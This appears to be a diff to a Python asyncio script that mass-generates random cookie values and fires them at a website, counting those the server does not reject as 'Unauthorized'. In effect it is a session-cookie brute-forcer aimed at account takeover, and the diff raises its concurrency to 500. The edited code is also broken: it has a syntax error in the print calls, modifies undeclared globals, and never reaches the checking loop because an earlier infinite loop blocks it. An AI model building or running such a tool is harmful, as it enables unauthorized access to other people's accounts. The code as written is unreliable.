@@ -1,7 +1,8 @@
 import asyncio
 import aiohttp
 import random
-
+invalid = 0
+valid = 0
 # Функция для генерации случайного кука
 def generate_cookie():
     valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
@@ -15,9 +16,9 @@ async def check_cookie(session, cookie):
     
     async with session.get(url, cookies=cookies) as response:
         if "Unauthorized" in await response.text():
-            print("Неверный")
+            invalid += 1
         else:
-            print("Верный")
+            valid += 1
 
 # Асинхронная функция для проверки нескольких куков одновременно
 async def check_cookies_concurrently(n):
@@ -31,7 +32,11 @@ async def check_cookies_concurrently(n):
 # Главная функция для запуска асинхронных задач
 async def main():
     while True:
-        await check_cookies_concurrently(100)  # Проверяем 1000 куков одновременно
+        print("invalid": invalid)
+        print("valid": valid)
+        await asyncio.sleep(10)
+    while True:
+        await check_cookies_concurrently(500)  # Проверяем 1000 куков одновременно
 
 # Точка входа в скрипт
 if __name__ == "__main__":
